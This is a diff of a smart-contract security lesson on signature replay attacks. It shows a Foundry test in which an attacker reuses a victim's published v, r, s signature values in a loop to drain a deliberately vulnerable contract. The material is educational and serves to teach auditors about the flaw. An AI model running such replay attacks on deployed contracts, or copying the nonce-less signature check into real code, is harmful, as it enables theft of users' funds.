@@ -2,57 +2,53 @@
 title: Exploit - Signature Replay Minimized
 ---
 
-
+_Follow along with the video lesson:_
 
 ---
 
-# Understanding Signature Replay Attacks: A Critical Look at Contemporary Blockchain Exploits
+### Exploit - Signature Replay Minimized
 
-Let's delve headfirst into one of the most recurrent threats on the blockchain- signature replay attacks. These attacks are unpleasantly commonplace and understanding them thoroughly is paramount in creating a secure, decentralized network. Now, signature replay attacks might sound menacingly complicated at first thought, but trust me, as we go through the concepts and how it actually happens, it will become significantly less intimidating!
+We need to talk about signature reply attacks, because they are painfully common in Web3.
 
-In my quest to provide a hands-on understanding of these signature replay attacks, I have created a fantastic open-source repo, `sc-exploits-minimized`, that will allow you to fiddle with blockchain signatures and remix them as you'd like. It's a great playground to get those hands dirty, but for the sake of understanding, I find it easier to pull up the **SC Exploits Minimized Test Case Unit**, specifically `signatureReplaytest.sol` file, and witness how signature replay attacks unfold in reality.
-
-## The Anatomy of Signature Replay Attacks
-
-Here's a breakdown of how the signature replay attack operates in this particular test case. The process involves a victim and an attacker, each playing their parts in a scenario that very much reflects the real-world possibility of such attacks.
-
-Here's an overview of the function: `testSignatureReplay`.
-
-- Firstly, a victim deposits some funds into the protocol. It's like putting your money in a virtual safe.
-- Once deposited, they engage in all sorts of encoding activities.
-- The victim then signs the digest or the formatted message to get the V, R and S values- These are generated as part of the ECDSA (Elliptic Curve Digital Signature Algorithm) sign message function.
-- After signing the digest, they proceed to call `WithdrawBySIG` to withdraw the required amount.
-
-This process, even though seems harmless, opens up a large vulnerability for potential attackers to exploit.
+We've got a great hands-on, [**Remix example**](https://remix.ethereum.org/#url=https://github.com/Cyfrin/sc-exploits-minimized/blob/main/src/signature-replay/SignatureReplay.sol&lang=en&optimize=false&runs=200&evmVersion=null&version=soljson-v0.8.20+commit.a1b79de6.js) in our [**sc-exploits-minimized**](https://github.com/Cyfrin/sc-exploits-minimized) repo to assist you in better understanding this attack vector. If you want to play with it in Remix, you're encouraged to do so, but I find it easier to bring up the [**SignatureReplayTest.t.sol**](https://github.com/Cyfrin/sc-exploits-minimized/blob/main/test/unit/SignatureReplayTest.t.sol) file in the sc-exploits-minimized repo locally.
 
 ```js
-function testSignatureReplay() public {
-    /* victim deposits into the protocol */
-    ...
-    /* encoding and digest signing to get V, R and S */
-    ...
-    /* victim calls 'WithdrawbySIG' */
-    ...
+function test_signatureReplay() public {
+    vm.startPrank(victim.addr);
+    signatureReplay.deposit{value: startingAmount}();
+
+    // These 3 lines happen off chain
+    bytes32 structHash = keccak256(abi.encode(signatureReplay.TYPEHASH(), withdrawAmount));
+    bytes32 digest = signatureReplay.getHashTypedDataV4(structHash); // This function will prepend the EIP-712 domain separator
+    (uint8 v, bytes32 r, bytes32 s) = vm.sign(victim.key, digest);
+
+    // Victim signs withdrawal of 1 ether, oh no! The signature is loose!
+    // The V, R, and S values are live!
+    signatureReplay.withdrawBySig(v, r, s, withdrawAmount);
+    vm.stopPrank();
+
+    assertEq(address(signatureReplay).balance, startingAmount - withdrawAmount);
+    assertEq(signatureReplay.balances(victim.addr), startingAmount - withdrawAmount);
+
+    vm.startPrank(attacker);
+    while (address(signatureReplay).balance >= 1 ether) {
+        signatureReplay.withdrawBySig(v, r, s, withdrawAmount);
     }
+    vm.stopPrank();
+
+    assertEq(address(signatureReplay).balance, 0);
+    assertEq(signatureReplay.balances(victim.addr), 0);
+}
 ```
 
-![](https://cdn.videotap.com/FIMkVw05x2zEDqU0YEm8-42.24.png)
+In this test, we have a victim depositing funds to a protocol and then signing a transaction with `vm.sign`. The victim then calls `withdrawBySig` which broadcasts the `v, r, and s` values of the victimes signature for this message, on-chain.
 
-## Unpacking The Flaw
+```js
+signatureReplay.withdrawBySig(v, r, s, withdrawAmount);
+```
 
-So where does it go wrong? Well, it's the post-withdrawal phase that introduces the opportunity for an attacker to wreak havoc. This is how it goes:
+From here, an attacker sees these values on-chain and decides to call the `withdrawBySig` function with them repeatedly until all funds are removed from the protocol.
 
-- Upon seeing the V, R and S on-chain, the attacker realizes that there's nothing preventing it from being reused. In essentially, having this crucial V, R and S information plastered on the chain without protections is just begging an attacker to play around with it.
-- The attacker then proceeds to continuously call `WithdrawbySIG` until all the money is missing, effectively draining the victim's funds.
+Granted, in this example the attacker isn't _stealing_ anything, you could see the potential exploits that could arise from this sort of vulnerability.
 
-Keep in mind that in this example, the attacker does not steal any money. Their primary goal is to kick the victim out of the protocol permanently, rendering any further transactions or involvement in the system impossible for the victim.
-
-It’s essential to note that the lack of mechanism in place to prevent the V, R and S from being reused is the critical flaw in this script.
-
-> **_"To tackle signature replay attacks effectively, you need to understand that the crux of the problem is the reuse of VR and S with no protective measures."_**
-
-## The Bigger Picture
-
-Signature replay attacks expose significant vulnerabilities in the blockchain system, making them a fertile ground for attackers to exploit. By understanding the nuts and bolts of these attacks, you can develop robust systems and strategies to circumvent these risks, contributing to a secure and more decentralized financial network.
-
-As we dive deeper into this brave, new, decentralized world, remember that understanding is the first step towards prevention. We aren't just tech enthusiasts; we're defenders of the future of finance! Be vigilant and keep learning.
+In the next lesson, we'll write up a `PoC` to showcase exactly how this could be exploited within `Boss Bridge`. See you there!
